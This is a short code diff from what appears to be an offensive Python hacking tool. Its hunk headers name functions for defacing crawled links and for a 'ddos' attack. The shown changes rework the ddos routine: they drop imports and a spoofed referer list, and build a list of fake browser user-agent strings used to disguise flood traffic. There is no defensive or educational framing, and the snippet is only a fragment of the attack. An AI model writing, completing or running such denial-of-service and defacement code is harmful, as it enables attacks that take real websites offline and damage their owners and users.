@@ -166,13 +166,6 @@ def crawl_and_deface_links():
 
 def ddos():
     try:
-        import os
-        import sys
-        import urllib.request
-        import urllib.error
-        import threading
-        import random
-        
         os.system("clear" if sys.platform == "linux" or sys.platform == "linux2" else "cls")
 
         print("\033[1;32m")
@@ -180,15 +173,9 @@ def ddos():
         print("\033[1;m")
 
         count = 0
-        headers = []
-        referer = [
-            "https://duckduckgo.com/",
-            "https://www.google.com/",
-            "https://www.youtube.com"
-        ]
 
         def useragent():
-            global headers
+            headers = []
             headers.append("Mozilla/5.0 (Windows Phone 10.0; Android 6.0.1; Microsoft; RM-1152)")
             headers.append("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)")
             headers.append("Mozilla/5.0 (Linux; Android 6.0.1; SM-G920V Build/MMB29K) AppleWebKit/537.36")
